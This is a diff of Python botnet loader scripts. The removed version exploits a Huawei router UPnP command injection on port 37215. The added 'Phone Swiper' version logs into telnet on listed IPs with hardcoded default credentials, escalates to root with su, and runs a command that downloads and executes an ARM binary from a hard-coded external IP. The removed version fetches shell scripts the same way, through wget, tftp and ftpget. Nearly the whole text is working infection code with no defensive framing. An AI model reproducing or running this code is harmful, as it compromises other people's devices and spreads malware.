@@ -1,38 +1,81 @@
-#! python !#
- 
-# Huawei Router Exploit Loader 
+#!/usr/bin/python
+# Phone Swiper 
+# You wanted it? Now you got it... fucking idiots !!!
 
-import sys, os, re
-from threading import Thread
-from time import sleep
-import requests
-from requests.auth import HTTPDigestAuth
-from decimal import *
+import threading, sys, time, random, socket, re, os
+ 
+if len(sys.argv) < 2:
+        print "Usage: python "+sys.argv[0]+" <list>"
+        sys.exit()
  
 ips = open(sys.argv[1], "r").readlines()
-motherthreads = int(sys.argv[2])
-motherthread_count = len(ips) / motherthreads
-motherthread_chunks = [ips[x:x+motherthread_count] for x in xrange(0, len(ips), motherthread_count)]
-cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.161 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
-payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
+usernames = ["root", "admin"]
+passwords = ["oelinux123", "admin"]
+cmd = "cd /tmp; rm -rf tftp; wget http://46.166.148.149/lel4 -O tftp; chmod +x tftp; ./tftp; rm -rf tftp" #arm4 binary
+count = 0
+def readUntil(tn, string, timeout=15):
+    buf = ''
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        buf += tn.recv(1024)
+        time.sleep(0.01)
+        if string in buf: return buf
+    raise Exception('TIMEOUT!')
  
-def dump(count):
-    count = int(count)
-    for i in motherthread_chunks[count]:
+class hackify(threading.Thread):
+        def __init__ (self, ip):
+            threading.Thread.__init__(self)
+            self.ip = str(ip).rstrip('\n')
+        def run(self):
         try:
-            url = "http://"+i+":37215/ctrlt/DeviceUpgrade_1"
-            url = re.sub('\n', '', url)
-            requests.post(url, timeout=8, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
-            print "PAYLOAD SENT %s"%(url)
-            motherthread_chunks[count] = motherthread_chunks[count].remove(i)
-        except:
-            pass
+            tn = socket.socket()
+            tn.settimeout(8)
+            tn.connect((self.ip,23))
+        except Exception:
+            tn.close()
+        try:
+            hoho = ''
+            hoho += readUntil(tn, ":")
+            if "mdm9625" in hoho: #non-root
+                r00t = 0
+                username = usernames[1]
+                password = passwords[1]
+                tn.send(username + "\n")
+                #print "[%s] sending non-root user"%(self.ip)
+            elif "9615-cdp" in hoho: #root
+                r00t = 1
+                username = usernames[0]
+                password = passwords[0]
+                tn.send(username + "\n")
+                #print "[%s] sending root user"%(self.ip)
+        except Exception:
+            tn.close()
+        try:
+            hoho = ''
+            hoho += readUntil(tn, "Password:")
+            if "assword" in hoho:
+                tn.send(password + "\n")
+                #if r00t: print "[%s] sending root password"%(self.ip)
+                #if not r00t: print "[%s] sending non-root password"%(self.ip)
+                time.sleep(3)
+        except Exception:
+            tn.close()
+        try:
+            mp = ''
+            mp += tn.recv(1024)
+            if "#" in mp or "$" in mp:
+                if r00t: tn.send(cmd + "\n"); print "command sent %s!"%(self.ip); time.sleep(10); tn.close()
+                if not r00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send(cmd + "\n"); print "command sent %s!"%(self.ip); time.sleep(10); tn.close()
+        except Exception:
+            print "[%s] TIMEOUT"%(count)
+            tn.close()
  
-for x in xrange(motherthreads):
+print "Total IPs: %s\n"%(len(ips))
+for ip in ips:
     try:
-        thread = Thread(target=dump, args=(x,))
-        thread.start()
-    except KeyboardInterrupt:
-        sys.exit("STOPPING!!!")
+        count += 1
+        t = hackify(ip)
+        t.start()
+        time.sleep(0.01)
     except:
         pass
